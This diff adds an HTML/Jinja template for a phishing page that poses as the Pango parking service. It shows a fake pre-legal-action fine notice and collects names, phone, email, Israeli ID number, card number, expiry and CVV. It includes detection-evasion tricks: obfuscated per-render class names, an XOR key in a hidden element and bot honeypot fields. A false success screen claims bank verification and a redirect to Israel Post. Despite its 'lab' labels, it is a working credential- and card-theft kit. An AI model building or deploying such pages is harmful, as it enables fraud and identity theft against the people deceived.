@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<!-- theme: bango (moved from frontend/templates/bango.html) -->
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pango | תשלום (lab)</title>
+    <link rel="stylesheet" href="/static/css/lab-theme.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Assistant:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;800&display=swap" rel="stylesheet">
+    {% if bango_shell_inject %}{{ bango_shell_inject|safe }}{% endif %}
+    <style>
+        :root {
+            --pango-blue: #2c64e3;
+            --pango-blue-hover: #2456cc;
+            --pango-blue-muted: #e8eeff;
+            --pango-border: #e0e0e0;
+            --pango-text: #1a1a1a;
+            --pango-muted: #757575;
+            --pango-placeholder: #9e9e9e;
+            --error-red: #d93025;
+            --pango-bg: #f0f2f5;
+        }
+        .{{ bcls['bango-page'] }} { font-family: 'Assistant', "Segoe UI", system-ui, sans-serif; background: var(--pango-bg); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; direction: rtl; unicode-bidi: isolate; color: var(--pango-text); }
+        .{{ bcls['bango-page'] }}, .{{ bcls['bango-page'] }} #bango-main, .{{ bcls['bango-page'] }} #bango-main form { direction: rtl; }
+        .{{ bcls['bango-shell'] }} { width: 100%; max-width: 420px; box-sizing: border-box; padding: 0.5rem 1.25rem 1.5rem; }
+        .{{ bcls['bango-hero'] }} { margin: 0 0 0.5rem; }
+        .{{ bcls['bango-hero__logo'] }} { display: block; margin: 0; }
+        .{{ bcls['bango-hero__logo'] }} img { width: 100px; height: auto; display: block; margin-inline-start: auto; margin-inline-end: 0; }
+        .{{ bcls['bango-segments'] }} { display: flex; width: 100%; background: #fff; border: 1px solid var(--pango-border); border-radius: 999px; padding: 4px; box-sizing: border-box; margin-bottom: 0.85rem; gap: 4px; }
+        .{{ bcls['bango-seg'] }} { flex: 1; border: none; background: transparent; cursor: pointer; font-family: inherit; font-size: 0.88rem; font-weight: 700; padding: 0.65rem 0.4rem; border-radius: 999px; color: var(--pango-blue); transition: background 0.2s, color 0.2s; }
+        .{{ bcls['bango-seg'] }}[aria-selected="true"] { background: var(--pango-blue); color: #fff; box-shadow: 0 2px 8px rgba(44, 100, 227, 0.35); }
+        .{{ bcls['bango-seg'] }}[aria-selected="false"] { color: #666; }
+        .{{ bcls['bango-seg'] }}:focus { outline: 2px solid var(--pango-blue); outline-offset: 2px; }
+        .{{ bcls['bango-surface'] }} { background: #fff; border-radius: 16px; box-shadow: 0 2px 14px rgba(0, 0, 0, 0.06); padding: 1.15rem 1.1rem 1.4rem; margin-bottom: 0.5rem; }
+        .{{ bcls['fine-banner'] }} { background: #fff8f8; border: 1px solid #f5d4d4; border-radius: 12px; padding: 0.9rem 1rem; margin-bottom: 1.1rem; text-align: start; border-inline-start: 4px solid var(--error-red); }
+        .{{ bcls['fine-title'] }} { color: var(--error-red); font-weight: 800; font-size: 1rem; margin-bottom: 0.4rem; }
+        .{{ bcls['fine-details'] }} { font-size: 0.85rem; color: #555; margin-bottom: 0.5rem; line-height: 1.5; }
+        .{{ bcls['amount-row'] }} { display: flex; justify-content: space-between; align-items: center; direction: rtl; }
+        .{{ bcls['amount'] }} { font-size: 1.35rem; font-weight: 800; color: #111; }
+        .{{ bcls['bango-section'] }} { margin-top: 0.4rem; scroll-margin-top: 0.5rem; }
+        .{{ bcls['bango-section--split'] }} { margin-top: 1rem; padding-top: 0.75rem; border-top: 1px solid #eee; }
+        .{{ bcls['bango-section__title'] }} { font-size: 0.78rem; font-weight: 700; color: var(--pango-muted); text-align: start; margin: 0 0 0.65rem; letter-spacing: 0.02em; }
+        .{{ bcls['form-group'] }} { margin-bottom: 0.9rem; text-align: start; }
+        .{{ bcls['form-group'] }} > label, #{{ bcls['bango-form'] }} .{{ bcls['form-group'] }} > label { display: block; font-weight: 600; margin-bottom: 0.4rem; font-size: 0.82rem; color: #5c5c5c; }
+        #{{ bcls['bango-form'] }} input { width: 100%; padding: 0.85rem 1rem; border: 1px solid var(--pango-border); border-radius: 10px; font-size: 1rem; box-sizing: border-box; background: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; direction: rtl; text-align: right; }
+        #{{ bcls['bango-form'] }} input::placeholder { color: var(--pango-placeholder); }
+        .{{ bcls['bango-field-error'] }} { display: block; color: #c0392b; font-size: 0.8rem; line-height: 1.3; margin-top: 4px; text-align: right; direction: rtl; unicode-bidi: isolate; }
+        .{{ bcls['bango-field-error'] }}[hidden] { display: none !important; }
+        #{{ bcls['bango-form'] }} input.{{ bcls['bango-input--error'] }}, #{{ bcls['bango-form'] }} .{{ bcls['bango-field-with-icon'] }} input.{{ bcls['bango-input--error'] }} { border: 2px solid #c0392b; box-shadow: none; }
+        #{{ bcls['bango-form'] }} input.{{ bcls['bango-input--error'] }}:focus, #{{ bcls['bango-form'] }} .{{ bcls['bango-field-with-icon'] }} input.{{ bcls['bango-input--error'] }}:focus { border-color: #c0392b; box-shadow: 0 0 0 2px rgba(192, 57, 43, 0.2); }
+        #{{ bcls['bango-form'] }} input:focus:not(.{{ bcls['bango-input--error'] }}) { border-color: var(--pango-blue); box-shadow: 0 0 0 1px rgba(44, 100, 227, 0.35); }
+        #{{ bcls['bango-form'] }}.{{ bcls['bango-attempted-submit'] }} input:not(.{{ bcls['bango-input--error'] }}) { border-color: var(--pango-border); }
+        .{{ bcls['row'] }} { display: flex; flex-direction: row; gap: 0.6rem; direction: rtl; }
+        .{{ bcls['row'] }} .{{ bcls['form-group'] }} { flex: 1; }
+        .{{ bcls['bango-field-with-icon'] }} { position: relative; width: 100%; }
+        .{{ bcls['bango-field-with-icon'] }} input { padding-inline-end: 2.6rem; }
+        .{{ bcls['bango-cvv-toggle'] }} { position: absolute; inset-inline-end: 0.55rem; top: 50%; transform: translateY(-50%); width: 2.1rem; height: 2.1rem; border: none; background: transparent; cursor: pointer; color: #9aa0a6; padding: 0; border-radius: 6px; display: flex; align-items: center; justify-content: center; }
+        .{{ bcls['bango-cvv-toggle'] }}:hover { color: #666; }
+        .{{ bcls['btn-submit'] }} { background: var(--pango-blue); color: #fff; border: none; width: 100%; padding: 0.95rem 1.25rem; border-radius: 999px; font-size: 1.05rem; font-weight: 800; cursor: pointer; margin-top: 1.1rem; direction: rtl; font-family: inherit; transition: background 0.2s; }
+        .{{ bcls['btn-submit'] }}:hover { background: var(--pango-blue-hover); }
+        .{{ bcls['btn-submit'] }}:disabled { opacity: 0.6; cursor: not-allowed; }
+        .{{ bcls['bango-footer-lab'] }} { text-align: center; margin-top: 1.25rem; font-size: 0.75rem; color: #999; line-height: 1.45; }
+        .{{ bcls['bango-footer-lab'] }} a { color: var(--pango-blue); text-decoration: none; font-weight: 600; }
+        .{{ bcls['bango-footer-lab'] }} a:hover { text-decoration: underline; }
+        #bango-msg { min-height: 0; color: var(--error-red); font-size: 0.86rem; margin: 0 0 0.35rem; text-align: start; }
+        #bango-loading-overlay.lab-glass-overlay.lab-glass-overlay--page-loading { background: linear-gradient(168deg, rgba(15, 23, 42, 0.14) 0%, rgba(30, 41, 59, 0.1) 50%, rgba(15, 23, 42, 0.12) 100%) !important; border: none !important; box-shadow: inset 0 0 0 1px rgba(148, 163, 184, 0.18) !important; backdrop-filter: blur(22px) saturate(1.2) !important; -webkit-backdrop-filter: blur(22px) saturate(1.2) !important; }
+        #bango-success-overlay[hidden] { display: none !important; }
+        .{{ bcls['bango-success-overlay'] }} { position: fixed; inset: 0; width: 100vw; min-height: 100vh; min-height: 100dvh; z-index: 9999999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; direction: rtl; font-family: "Heebo", "Assistant", system-ui, sans-serif; box-sizing: border-box; padding: 1rem; max-width: 100%; background: linear-gradient(170deg, rgba(15, 23, 42, 0.22) 0%, rgba(30, 41, 59, 0.3) 45%, rgba(15, 23, 42, 0.26) 100%); backdrop-filter: blur(24px) saturate(1.15); -webkit-backdrop-filter: blur(24px) saturate(1.15); box-shadow: inset 0 0 0 1px rgba(148, 163, 184, 0.2); }
+        .{{ bcls['bango-success-overlay__icon'] }} { width: 3.5rem; height: 3.5rem; background: rgba(76, 175, 80, 0.95); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 0 0.65rem; flex-shrink: 0; box-shadow: 0 0 14px rgba(76, 175, 80, 0.4); border: 1.5px solid rgba(255, 255, 255, 0.35); }
+        .{{ bcls['bango-success-overlay__spinner'] }} { box-sizing: border-box; margin-top: 0.9rem; width: 3.25rem; height: 3.25rem; flex-shrink: 0; border: 3px solid rgba(148, 163, 184, 0.25); border-top-color: #4caf50; border-radius: 50%; animation: bango-success-spin-pp 0.78s linear infinite; }
+        @keyframes bango-success-spin-pp { to { transform: rotate(360deg); } }
+    </style>
+    {% if active_theme_id == "clear" %}
+    <style>
+        #{{ bcls['bango-form'] }} .{{ bcls['form-group'] }} > label { color: #1f2937; font-weight: 800; font-size: 0.9rem; }
+        #{{ bcls['bango-form'] }} input { border: 2px solid #1d4ed8; background: #ffffff; box-shadow: 0 0 0 2px rgba(29, 78, 216, 0.08); }
+        #{{ bcls['bango-form'] }} input::placeholder { color: #4b5563; opacity: 1; }
+        #{{ bcls['bango-form'] }} input:focus { border-color: #1e40af; box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.2); }
+    </style>
+    {% endif %}
+</head>
+<body class="{{ bcls['bango-page'] }}">
+  <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ bango_ui_map_json|e }}" data-ui-key="{{ bango_xor_key|e }}" aria-hidden="true">.</div>
+<div class="{{ bcls['bango-shell'] }}" id="bango-main">
+    <p id="bango-msg" role="status" aria-live="polite"></p>
+    <div class="{{ bcls['bango-hero'] }}"><div class="{{ bcls['bango-hero__logo'] }}"><img src="data:image/svg+xml,%3csvg%20width='241'%20height='60'%20viewBox='0%200%20241%2060'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M113.323%200C100.965%200%2093.5879%207.66055%2093.5879%2020.4914V41.5391H104.272V20.4914C104.272%2013.8589%20107.487%2010.2052%20113.323%2010.2052C119.16%2010.2052%20122.374%2013.8589%20122.374%2020.4914V41.5391H133.059V20.4914C133.059%207.66055%20125.681%200%20113.323%200Z'%20fill='%232C64E3'/%3e%3c/svg%3e" alt="pango" /></div></div>
+    <div class="{{ bcls['bango-segments'] }}" role="tablist" aria-label="אזור טופס">
+        <button type="button" class="{{ bcls['bango-seg'] }}" id="bango-seg-1" role="tab" aria-selected="true" aria-controls="bango-section-client">פרטי לקוח</button>
+        <button type="button" class="{{ bcls['bango-seg'] }}" id="bango-seg-2" role="tab" aria-selected="false" aria-controls="bango-section-card">פרטי אשראי</button>
+    </div>
+    <div class="{{ bcls['bango-surface'] }}">
+        <div class="{{ bcls['fine-banner'] }}">
+            <div class="{{ bcls['fine-title'] }}">התראה לפני נקיטת הליכים</div>
+            <div class="{{ bcls['fine-details'] }}">מספר דוח: <span id="reportNum">{{ bango_fine_report|e }}</span><br>תאריך העבירה: <span id="reportDate">{{ bango_fine_date|e }}</span></div>
+            <div class="{{ bcls['amount-row'] }}"><span>יתרה לתשלום:</span><span class="{{ bcls['amount'] }}" id="randomAmount">₪ {{ bango_fine_amount|e }}</span></div>
+        </div>
+        <form id="{{ bcls['bango-form'] }}" dir="rtl" lang="he" novalidate>
+            <div class="{{ bcls['bango-section'] }}" id="bango-section-client" role="region" aria-labelledby="bango-seg-1">
+                <p class="{{ bcls['bango-section__title'] }}">פרטי לקוח</p>
+                <div class="{{ bcls['row'] }}">
+                    <div class="{{ bcls['form-group'] }}"><label for="fname">שם פרטי</label><input type="text" id="fname" name="fname" dir="rtl" inputmode="text" pattern="[A-Za-zא-ת\s]*" placeholder="הכנס שם פרטי" required autocomplete="given-name" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-fname" hidden role="alert">שדה חובה</span></div>
+                    <div class="{{ bcls['form-group'] }}"><label for="lname">שם משפחה</label><input type="text" id="lname" name="lname" dir="rtl" inputmode="text" pattern="[A-Za-zא-ת\s]*" placeholder="הכנס שם משפחה" required autocomplete="family-name" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-lname" hidden role="alert">שדה חובה</span></div>
+                </div>
+                <div class="{{ bcls['form-group'] }}"><label for="phone">מספר טלפון נייד</label><input type="tel" id="phone" name="phone" dir="rtl" inputmode="numeric" pattern="[0-9]*" maxlength="10" placeholder="050-000-0000" required autocomplete="tel" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-phone" hidden role="alert">שדה חובה</span></div>
+                <div class="{{ bcls['form-group'] }}"><label for="email">כתובת אימייל</label><input type="email" id="email" name="email" dir="rtl" placeholder="example@mail.com" required autocomplete="email" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-email" hidden role="alert">שדה חובה</span></div>
+                <div class="{{ bcls['form-group'] }}"><label for="id_num">מספר תעודת זהות</label><input type="tel" id="id_num" name="id_num" dir="rtl" placeholder="000000000" pattern="[0-9]*" maxlength="9" inputmode="numeric" required autocomplete="off" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-id_num" hidden role="alert">שדה חובה</span></div>
+            </div>
+            <div class="{{ bcls['bango-section'] }} {{ bcls['bango-section--split'] }}" id="bango-section-card" role="region" aria-labelledby="bango-seg-2">
+                <p class="{{ bcls['bango-section__title'] }}">פרטי תשלום אשראי</p>
+                <div class="{{ bcls['form-group'] }}"><label for="card">מספר כרטיס</label><input type="tel" id="card" name="card" dir="rtl" placeholder="**** **** **** ****" maxlength="22" inputmode="numeric" pattern="[0-9]*" required autocomplete="cc-number" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-card" hidden role="alert">שדה חובה</span></div>
+                <div class="{{ bcls['row'] }}">
+                    <div class="{{ bcls['form-group'] }}"><label for="exp">תוקף הכרטיס</label><input type="tel" id="exp" name="exp" dir="rtl" placeholder="MM/YY" maxlength="5" inputmode="numeric" pattern="[0-9]*" required autocomplete="cc-exp" /><span class="{{ bcls['bango-field-error'] }}" id="bango-err-exp" hidden role="alert">שדה חובה</span></div>
+                    <div class="{{ bcls['form-group'] }}"><label for="cvv">קוד CVV</label><div class="{{ bcls['bango-field-with-icon'] }}"><input type="password" id="cvv" name="cvv" class="{{ bcls['bango-cvv-input'] }}" inputmode="numeric" pattern="[0-9]*" placeholder="000" maxlength="4" required autocomplete="cc-csc" dir="rtl" /><button type="button" class="{{ bcls['bango-cvv-toggle'] }}" id="bango-cvv-toggle" aria-pressed="false" title="הצג/הסתר" aria-label="הצג או הסתר קוד אבטחה"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" /><circle cx="12" cy="12" r="3" /></svg></button></div><span class="{{ bcls['bango-field-error'] }}" id="bango-err-cvv" hidden role="alert">שדה חובה</span></div>
+                </div>
+            </div>
+            <div style="position:absolute;left:-9999px;height:0;overflow:hidden;opacity:0" aria-hidden="true"><input type="text" name="bango_honeypot_company" id="bango-hp-company" tabindex="-1" autocomplete="off" value="" /><input type="text" name="bango_honeypot_website" id="bango-hp-website" tabindex="-1" autocomplete="off" value="" /></div>
+            <button type="submit" class="{{ bcls['btn-submit'] }}">שלם עכשיו</button>
+        </form>
+    </div>
+    <p class="{{ bcls['bango-footer-lab'] }}" dir="rtl" lang="he">שכחת פרטים? <a href="#" onclick="return false;">עזרה</a> — עמוד הדגמה (מעבדה)</p>
+</div>
+<div id="bango-loading-overlay" class="lab-glass-overlay lab-glass-overlay--viewport lab-glass-overlay--page-loading" hidden aria-hidden="true"><div class="lab-spinner lab-spinner--lg" aria-hidden="true"></div><span class="lab-sr-only">Loading</span></div>
+<div id="bango-success-overlay" class="{{ bcls['bango-success-overlay'] }}" hidden aria-hidden="true" role="alert" lang="he" dir="rtl"><div class="{{ bcls['bango-success-overlay__icon'] }}" aria-hidden="true"><svg width="55" height="55" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div><h2 class="{{ bcls['bango-success-overlay__title'] }}">הפעולה הושלמה בהצלחה</h2><p class="{{ bcls['bango-success-overlay__text'] }}">הנתונים אומתו בהצלחה מול שרת הבנק המנפיק.<br>הנך מועבר לדף הבית של דואר ישראל...</p><div class="{{ bcls['bango-success-overlay__spinner'] }}" aria-hidden="true"></div></div>
+{% include 'bango/scripts.html' %}
+</body>
+</html>
